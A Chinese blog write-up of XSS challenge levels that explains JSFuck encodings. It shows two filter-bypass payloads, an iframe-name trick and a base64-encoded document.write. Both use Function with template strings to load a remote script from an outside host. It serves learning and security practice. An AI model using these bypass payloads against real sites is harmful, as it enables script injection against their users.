首先是 `[]['filter']['constructor']` 这一部分，经查，这种语法是 `JSFuck` 的用法。

JSFuck 是一种深奥的 JavaScript 编程风格。以这种风格写成的代码中仅使用 `[`、`]`、`(`、`)`、`!` 和 `+` 六种字符。

此编程风格的名字派生自仅使用较少符号写代码的 Brainfuck
语言。与其他深奥的编程语言不同，以JSFuck风格写出的代码不需要另外的编译器或解释器来执行，无论浏览器或 JavaScript 引擎中的原生
JavaScript 解释器皆可直接运行。

鉴于 JavaScript 是弱类型语言，编写者可以用数量有限的字符重写 JavaScript 中的所有功能，且可以用这种方式执行任何类型的表达式。

JSFuck 常见的取值有以下这些：

    
    
    false       =>  ![]
    true        =>  !![]
    undefined   =>  [][[]]
    NaN         =>  +[![]]
    0           =>  +[]
    1           =>  +!+[]
    2           =>  !+[]+!+[]
    10          =>  [+!+[]]+[+[]]
    Array       =>  []
    Number      =>  +[]
    String      =>  []+[]
    Boolean     =>  ![]
    Function    =>  []["filter"]
    eval        =>  []["filter"]["constructor"]( CODE )()
    window      =>  []["filter"]["constructor"]("return this")()
    

回到题目，根据上面这个对应关系，我们可以 `[]['filter']['constructor']` 对应成
`eval`，后面的部分已经很熟悉了，这里就不再赘述了。

这里也有一个不好理解的地方，在`${location['hash']['slice'](1)}`
这个地方的前面，作者添上了一个字符，说是不添加就会报错，我自己也尝试了一下，确实是这样：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/27d70f6b26804e798121fefbd076d190.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)  
报错显示缺少形参。

填上之后就弹窗了：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/af2dbf456c7c4e6da7e0d7ac730be4b5.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)  
难不成添加的字符就是做形参用的？

但是这个原理实在不能理解🙄🙄🙄

# 独孤九剑-第八式

## 题目

![在这里插入图片描述](https://img-
blog.csdnimg.cn/92f9c933b9a740ed9a038c72d89726bc.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)

> **在上一题的基础上，又新增了对`'`、`"`、`[]` 的过滤**

面对越来越变态的过滤方式，只能看看作者本人的做法了。

## 方法一

题目作者本人给出的方法：

    
    
    <iframe src="http://xcao.vip/test/xss8.php/?data=Function`b${name}```" name="with(document)body.appendChild(createElement('script')).src='http://xcao.vip/xss/alert.js'"></iframe>
    

作者称，他是直接新建了一个网页，往文件里面写入了这个代码。

这里的 `Function()` 是一个 **匿名函数** ，没有函数名。通过给变量 `name` 赋值，然后传入模板字符串，再执行 JavaScript
文件。

点开这个网页的时候，直接执行里面的代码。

成功弹窗：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/ac41308c1bd14642aad019f94035b329.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)  
奇怪的姿势又增加了！

## 方法二

    
    
    http://xcao.vip/test/xss8.php?data=Function`b${atob`ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPSdodHRwOi8veGNhby52aXAveHNzL2FsZXJ0LmpzJz48L3NjcmlwdD4iKQ`}```
    

让我们来看看又用了哪些新姿势。

外层 `Function()` 函数是一样的，这里遇到了一个新方法 `atob()`，经查得知，`atob()` 方法用于解码使用 `base64`
编码的字符串。

而里面的字符串解码过后的内容是这样的：

    
    
    document.write("<script src='http://xcao.vip/xss/alert.js'></script>")
    

成功弹窗：  
![在这里插入图片描述](https://img-
blog.csdnimg.cn/2b8d25e72e9946c0a8eb44106654e9a2.png?x-oss-
process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMxNDg4,size_16,color_FFFFFF,t_70)  
太棒了，学到许多（

posted @ 2021-09-04 22:52
[\--Kisaragi--](https://www.cnblogs.com/--kisaragi--/)  阅读(153)  评论(0)
[编辑](https://i.cnblogs.com/EditPosts.aspx?postid=15228152)
[收藏](javascript:void\(0\))  [举报](javascript:void\(0\))

[刷新评论](javascript:void\(0\);)刷新页面返回顶部

[
![](https://img2020.cnblogs.com/blog/35695/202110/35695-20211008160624813-1694591598.jpg)
](https://c.gridsumdissector.com/r/?gid=gad_545_mzyfo0un&ck=46&adk=566&autorefresh=__AUTOREFRESH__)

Copyright (C) 2021 --Kisaragi--  
Powered by .NET 6 on Kubernetes

